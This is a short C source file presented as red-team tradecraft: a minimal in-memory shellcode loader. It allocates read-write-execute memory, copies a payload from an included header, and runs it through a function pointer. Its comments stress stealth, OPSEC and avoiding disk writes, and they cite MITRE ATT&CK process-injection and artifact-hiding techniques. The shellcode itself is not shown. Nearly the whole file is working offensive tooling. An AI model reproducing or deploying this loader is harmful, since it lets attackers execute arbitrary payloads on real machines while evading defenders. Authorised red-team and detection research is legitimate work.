// File: shellcode_injector.c
// Purpose: Minimalist in-memory loader for shellcode detonation.
// shellcode_injector.c
// Red Team Tradecraft: Allocates RWX memory, injects payload, and executes directly in memory for stealth (MITRE ATT&CK T1055 - Process Injection, T1564 - Hide Artifacts).

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

#include "shellcode.h"

// Entry Point: orchestrates staging (allocation), injection, and execution phases.
int main() {
    // Stage 1: Allocate RWX memory for payload staging (avoids disk writes, stealth).
    void *exec_mem = mmap(NULL,
                          shellcode_len,
                          PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_ANONYMOUS | MAP_PRIVATE,
                          -1,
                          0);

    // Handle allocation failure: minimal logging for OPSEC, clean exit.
    if (exec_mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    // Stage 2: Copy shellcode into allocated region (unhooked memcpy for stealth).
    memcpy(exec_mem, shellcode, shellcode_len);

    // Stage 3: Transfer execution to payload via direct function pointer call.
    ((void (*)())exec_mem)();

    // Clean exit when payload returns (rare in shellcode).
    return 0;
}

